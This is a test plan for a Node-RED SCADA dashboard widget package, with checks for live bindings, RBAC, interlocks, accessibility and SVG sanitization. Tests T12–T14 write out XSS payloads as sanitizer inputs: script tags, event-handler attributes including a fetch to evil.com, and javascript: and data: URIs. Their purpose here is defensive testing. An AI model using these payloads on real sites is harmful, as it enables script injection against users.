# SCADA Kit v0.1.0 — Systematic Test Plan

**Package:** `@jsgorana/node-red-dashboard-2-scada`  
**Environment:** Docker Node-RED, port 1880  
**Dashboard base URL:** `http://localhost:1880/scada/test/`

Deploy test flows first (idempotent, safe to re-run):
```bash
node scripts/deploy-test-flows.mjs
```

---

## Test Areas

| # | Area | Tab | Priority |
|---|------|-----|----------|
| 1 | Basic render & live bindings | Mimic | P1 |
| 2 | Comm-loss / quality fallbacks | Mimic | P1 |
| 3 | Click event delivery | Mimic | P1 |
| 4 | Topic scalar input (SRS §3.3) | Mimic | P1 |
| 5 | Faceplate — all 3 templates | Faceplates | P1 |
| 6 | Faceplate — live state subscription | Faceplates | P1 |
| 7 | Faceplate — write confirm flow | Faceplates | P1 |
| 8 | RBAC — deny by role | Faceplates | P1 |
| 9 | RBAC — allow by role | Faceplates | P1 |
| 10 | Interlock lockout | Faceplates | P1 |
| 11 | Symbol gallery — state cycling | Symbols | P2 |
| 12 | SVG XSS — inline SVG payload | Mimic | P1 |
| 13 | SVG XSS — event attribute stripping | Mimic | P1 |
| 14 | SVG XSS — href/data: URI blocking | Mimic | P1 |
| 15 | Node editor — help panel content | Both | P2 |
| 16 | Node editor — bindings JSON validator | Mimic | P2 |
| 17 | WCAG — keyboard navigation | Faceplates | P2 |
| 18 | WCAG — aria-live announcements | Faceplates | P2 |
| 19 | Mimic — SVG dynamic SVG swap | Mimic | P2 |
| 20 | Stress / rapid update | Mimic | P3 |

---

## Pre-flight Checks

Before starting, verify:

```bash
# Package installed and both nodes enabled
curl -s http://localhost:1880/nodes | python3 -c "
import json,sys
nodes = json.load(sys.stdin)
scada = [n for n in nodes if n.get('module','').endswith('dashboard-2-scada')]
for n in scada: print(n['id'], n['version'], 'enabled=' + str(n['enabled']))
"
# Expected:
# ui-scada-mimic 0.1.0 enabled=True
# ui-scada-faceplate 0.1.0 enabled=True

# All 3 test tabs exist
curl -s http://localhost:1880/flows | python3 -c "
import json,sys
tabs = [n for n in json.load(sys.stdin) if n.get('type')=='tab']
[print(t['id'], t['label']) for t in tabs]
"
# Expected: 8 tabs total, personal 5 plus the 3 SCADA test tabs
```

---

## T01 — Basic Render & Live Bindings

**URL:** `http://localhost:1880/scada/test/mimic`  
**Flow tab:** SCADA Test — Mimic

1. Open the Mimic dashboard URL in a browser.
2. The tank/pump diagram should render immediately (no blank box).
3. The tank fill level should oscillate smoothly (sine wave, 2 s period).
4. The pump circle fills **blue** when level > 40%, **gray** when level ≤ 40%.
5. The pump status label reads `RUNNING` or `STOPPED` to match fill color.
6. The tank percentage label updates with one decimal place, e.g. `62.4 %`.

**Pass criteria:** All 5 visual states animate within 4 s of page load.

---

## T02 — Comm-Loss / Quality Fallbacks

**Flow tab:** SCADA Test — Mimic

1. In the Node-RED editor, click the **"Simulate comm-loss (bad quality)"** inject node.
2. Return to the dashboard.

**Pass criteria:**
- Tank fill **collapses to zero** height (level binding `quality.onBad = '0'`).
- Level text shows `-- %` (transform `quality.onBad = '-- %'`).
- Pump circle turns **gray** (fallback `nofeedback`).
- Pump status shows `NO DATA`.
- After the 10 s `commLossTimeout`, the widget displays a **comm-loss overlay** (gray cross-hatch or message).

3. Click the **"Simulate tags (2 s)"** inject to restore live data. Verify the widget recovers within one injection cycle.

---

## T03 — Click Event Delivery

**Flow tab:** SCADA Test — Mimic

1. Open the Node-RED editor sidebar → **Debug** panel.
2. Open the Mimic dashboard in a browser.
3. Click the pump symbol (P-101).
4. In the Debug panel, verify a message appears on **"Click events"** debug node with:
   ```json
   { "topic": "open-faceplate", "payload": { "equip": "P101", "type": "motor" } }
   ```

**Pass criteria:** Debug panel shows the exact `topic`/`payload` within 1 s of click. If no message appears, the `socket.emit('widget-action', id, msg)` positional signature is broken (gotcha #12).

---

## T04 — Topic Scalar Input (SRS §3.3)

**Flow tab:** SCADA Test — Mimic

1. In the editor, click **"Scalar topic update (TK01.level → 95)"** inject.
2. Return to the dashboard.

**Pass criteria:** Tank fill jumps to ~95% (full). Level text shows `95.0 %`. This confirms the `msg.topic` + scalar `msg.payload` normalization in `nodes/ui-scada-mimic.js`.

---

## T05 — Faceplate Templates Render

**URL:** `http://localhost:1880/scada/test/faceplates`  
**Flow tab:** SCADA Test — Faceplates

1. Open the Faceplates dashboard.
2. Verify all **three faceplate widgets** render (P-101 Motor, FV-201 Valve, TIC-301 PID).
3. Each should show:
   - Header with equipment tag + status chip.
   - `PV`, `SP`, `Mode` value row.
   - Template-specific controls (Motor: START/STOP/E-STOP; Valve: OPEN/CLOSE; PID: setpoint input + AUTO/MAN).

**Pass criteria:** All three faceplates visible with correct labels and controls.

---

## T06 — Faceplate Live State Subscription

**Flow tab:** SCADA Test — Faceplates

1. Open the Faceplates dashboard.
2. The **"Seed faceplate state (2 s)"** inject runs automatically on deploy (once = true).
3. Verify PV values update every 2 s:
   - P-101: amps oscillate ~8–12 A.
   - FV-201: position oscillates ~70–80%.
   - TIC-301: temperature oscillates ~43–51.

**Pass criteria:** PV values animate. If values are static, the `$dataTracker` subscription is not working (gotcha #14).

---

## T07 — Write Confirm Flow

**Flow tab:** SCADA Test — Faceplates

1. On the Motor (P-101) faceplate, click the **START** button.
2. A **confirmation dialog** should appear: "Confirm: Start P-101".
3. Click **Cancel** — no debug message should appear on output 1 or output 2.
4. Click START again, then **Confirm**.
5. Verify a debug message appears on **"Motor — allowed write / state"** debug node with:
   ```json
   { "action": "motor.start", "topic": "motor.start", "payload": { "command": "START" } }
   ```

**Pass criteria:** Cancel suppresses write. Confirm triggers message.

---

## T08 — RBAC Deny by Role

**Flow tab:** SCADA Test — Faceplates

This tests the deny path for users not in the allowed roles list.

1. In the editor, add a **change node** before the Faceplate node that sets:
   ```
   msg.req.user.role = "viewer"
   ```
   (or inject a message with `msg._client.roles = ["viewer"]`)
2. Re-inject a write attempt to the Valve (FV-201) OPEN button.
3. Verify **output 2** (audit) receives:
   ```json
   { "denied": true, "reason": "RBAC", "role": "viewer" }
   ```

**Alternative (no flow edit):** Open the faceplate from an incognito browser with no user session — the RBAC default should deny writes for unauthenticated clients.

**Pass criteria:** Denied audit record on output 2; NO message on output 1.

---

## T09 — RBAC Allow by Role

**Flow tab:** SCADA Test — Faceplates

1. Inject a write attempt with `msg._client.roles = ["operator"]` (in allowed roles: `operator, supervisor, engineer`).
2. Verify the write is **allowed** — message appears on output 1, audit record on output 2 with `denied: false`.

**Pass criteria:** Operator role permits write through output 1.

---

## T10 — Interlock Lockout

**Flow tab:** SCADA Test — Faceplates

1. Click the **"Toggle interlock on P-101"** inject node.
2. On the Motor faceplate, verify:
   - State header shows `TRIPPED` or `FAULT`.
   - START/STOP buttons are **disabled** (grayed, not clickable).
   - An interlock indicator is visible.
3. Attempt to click START anyway.

**Pass criteria:** No write message on output 1 or 2 when interlock is active.

---

## T11 — Symbol Gallery State Cycling

**URL:** `http://localhost:1880/scada/test/symbols`  
**Flow tab:** SCADA Test — Symbols

1. Open the Symbols gallery dashboard.
2. All 11 symbols should render in a grid.
3. The **"Cycle symbol states (3 s)"** inject auto-starts, cycling each symbol through RUNNING → STOPPED → ALARM.
4. Verify:
   - Each symbol's body fill changes color on each state transition.
   - Status text below each symbol updates.
   - Alarm indicators appear/disappear on ALARM state.
   - No symbol is blank or shows as a gray box.

**Pass criteria:** All 11 symbols animate through all 3 states. No blank boxes. (If blank: check `--hmi-*` CSS variable injection in the gallery SVG `<style>` block — gotcha #6.)

---

## T12 — XSS: Inline `<script>` Tag Stripped

**Flow tab:** SCADA Test — Mimic

1. In the editor, add a **change node** before the mimic node that replaces `msg.payload` with:
   ```javascript
   msg.payload = {
     svg: '<svg><script>alert("XSS")<\/script><circle cx="50" cy="50" r="40" fill="blue"/></svg>'
   };
   ```
2. Trigger the inject.
3. Return to the dashboard.

**Pass criteria:**
- No browser alert fires.
- The blue circle renders (valid SVG content passes through).
- In devtools → Elements, confirm there is NO `<script>` tag inside the mimic widget.

---

## T13 — XSS: Event Attribute Stripped

**Flow tab:** SCADA Test — Mimic

1. Inject an SVG with event attributes:
   ```javascript
   msg.payload = {
     svg: '<svg><circle cx="50" cy="50" r="40" fill="red" onmouseover="alert(1)" onclick="fetch(\'http://evil.com\')"/></svg>'
   };
   ```

**Pass criteria:**
- No alert fires on mouse interaction.
- In devtools, confirm `onmouseover` and `onclick` are absent from the rendered element.
- The red circle still renders (element preserved, only attributes stripped).

Also test SVG animation events:
   ```javascript
   msg.payload = {
     svg: '<svg><animate onbegin="alert(2)" attributeName="x" from="0" to="100" dur="1s"/></svg>'
   };
   ```
**Pass criteria:** No alert. `onbegin` absent in DOM. (This specifically validates the `uponSanitizeAttribute` hook over a static `FORBID_ATTR` list — gotcha #13.)

---

## T14 — XSS: `javascript:` and `data:` URI Blocked

**Flow tab:** SCADA Test — Mimic

1. Inject:
   ```javascript
   msg.payload = {
     svg: '<svg><a href="javascript:alert(3)"><circle cx="50" cy="50" r="40" fill="green"/></a></svg>'
   };
   ```
2. On the dashboard, click the green circle.

**Pass criteria:** No alert. `href` attribute is either stripped or replaced with `#`. Circle may or may not render — the `<a>` tag is allowed but its malicious `href` must be blocked by `ALLOWED_URI_REGEXP`.

Test `data:` URI:
   ```javascript
   '<image href="data:text/html,<script>alert(4)<\/script>" width="100" height="100"/>'
   ```
**Pass criteria:** `href` is stripped. No script execution.

---

## T15 — Node Editor Help Panels

**Applies to:** Both nodes in the Node-RED editor

1. Open the Node-RED editor: `http://localhost:1880/`.
2. Double-click any `ui-scada-mimic` node.
3. Click the **"?"** (help) icon or switch to the **Info** tab in the editor sidebar.

**Pass criteria — Mimic help must contain:**
- [ ] Overview: purpose, ISA-101 design intent
- [ ] Inputs: flat tag map, structured with quality, topic+scalar examples
- [ ] Outputs: click event structure `{ topic, payload, equip, x, y }`
- [ ] Binding DSL: all target types (text, style, level, visibility, attr, class)
- [ ] Transform pipeline: value map, format (decimals/suffix), quality fallback
- [ ] HP-HMI theme token table (all `--hmi-*` CSS variables)
- [ ] Security section: sanitizer description, MutationObserver guard
- [ ] References: ISA-101, IEC 62443, SRS link

4. Repeat for `ui-scada-faceplate`.

**Pass criteria — Faceplate help must contain:**
- [ ] Overview: 3 templates (motor/valve/pid), write-confirm flow
- [ ] All input payload fields (pv/sp/mode/status/interlock)
- [ ] Both outputs with audit record format
- [ ] RBAC: allowRoles field, DEFAULT_WRITE_ROLES, mock injection tip
- [ ] Compliance notes: IEC 62443-4-2 CRs (2.1, 2.8/2.9, 3.5, 7.1)

---

## T16 — Bindings JSON Validator

**Applies to:** `ui-scada-mimic` node editor

1. Open any `ui-scada-mimic` node in the editor.
2. In the **Bindings** textarea, type invalid JSON (e.g., remove a closing `}`).
3. Click outside the textarea (blur event).

**Pass criteria:** An error hint appears below the textarea (e.g., red border, "Invalid JSON" message). Valid JSON should auto-format on blur.

---

## T17 — WCAG Keyboard Navigation

**URL:** `http://localhost:1880/scada/test/faceplates`

1. Open the Faceplates dashboard.
2. Press **Tab** to navigate to the Motor faceplate.
3. Tab through the START, STOP, E-STOP buttons.

**Pass criteria:**
- Each button receives a visible focus ring (2 px outline, `focus-visible`).
- Press **Enter** on START — confirmation dialog opens.
- Press **Tab** in the dialog to reach Cancel and Confirm.
- Press **Escape** or Tab to Cancel, press **Enter** — dialog closes, no write.

Target size: buttons must be at least 44 px tall (WCAG 2.5.8). Verify via browser devtools computed styles → `height`.

---

## T18 — ARIA Live Announcements

**URL:** `http://localhost:1880/scada/test/faceplates`

1. Open the Faceplates dashboard with a screen reader active (or Chrome devtools → Accessibility).
2. When the faceplate state changes (via injected data), the state chip should announce.

**Pass criteria:**
- `aria-live="polite"` is present on the `.faceplate-state` element.
- Screen reader announces status changes (RUNNING → STOPPED) without requiring focus.
- `aria-label` is present on PV, SP, Mode `<dd>` elements: "Process variable", "Setpoint", "Control mode".

---

## T19 — Dynamic SVG Swap

**Flow tab:** SCADA Test — Mimic

1. Inject a completely different SVG (replacing the tank/pump diagram):
   ```javascript
   msg.payload = {
     svg: '<svg viewBox="0 0 200 100"><rect x="10" y="10" width="180" height="80" fill="var(--hmi-bg-display,#f5f5f5)" stroke="var(--hmi-line-normal,#757575)" stroke-width="2"/><text x="100" y="58" text-anchor="middle" font-family="Arial" font-size="14" fill="var(--hmi-text-primary,#212121)" stroke="none">SVG SWAP OK</text></svg>'
   };
   ```

**Pass criteria:**
- Widget shows the replacement SVG "SVG SWAP OK" text.
- Widget does not go blank or throw a console error.
- Subsequent tag data injections re-apply bindings against the new SVG (if element IDs match, they bind; if not, they silently skip).

---

## T20 — Stress / Rapid Update

**Flow tab:** SCADA Test — Mimic

1. In the editor, change the **"Simulate tags (2 s)"** inject repeat interval from `2` to `0.1`.
2. Let it run for 30 seconds.

**Pass criteria:**
- No browser tab crash or "page unresponsive" warning.
- No memory leak visible in Chrome devtools → Memory (heap should stabilize, not grow unbounded).
- SVG renders correctly at all times (no flickering blank frames).

3. Reset the interval back to `2` when done.

---

## Results Checklist

| Test | Pass | Fail | Notes |
|------|------|------|-------|
| T01 Basic render | | | |
| T02 Comm-loss | | | |
| T03 Click events | | | |
| T04 Topic scalar | | | |
| T05 Faceplate render | | | |
| T06 Live state subscription | | | |
| T07 Write confirm | | | |
| T08 RBAC deny | | | |
| T09 RBAC allow | | | |
| T10 Interlock lockout | | | |
| T11 Symbol gallery | | | |
| T12 XSS script tag | | | |
| T13 XSS event attrs | | | |
| T14 XSS URI schemes | | | |
| T15 Help panels | | | |
| T16 JSON validator | | | |
| T17 Keyboard nav | | | |
| T18 ARIA live | | | |
| T19 SVG swap | | | |
| T20 Stress test | | | |

**Sign-off:**  
Tester: _______________  
Date: _______________  
Version: v0.1.0  
All P1 tests pass? ☐  
All P2 tests pass? ☐  
Ready to publish: ☐
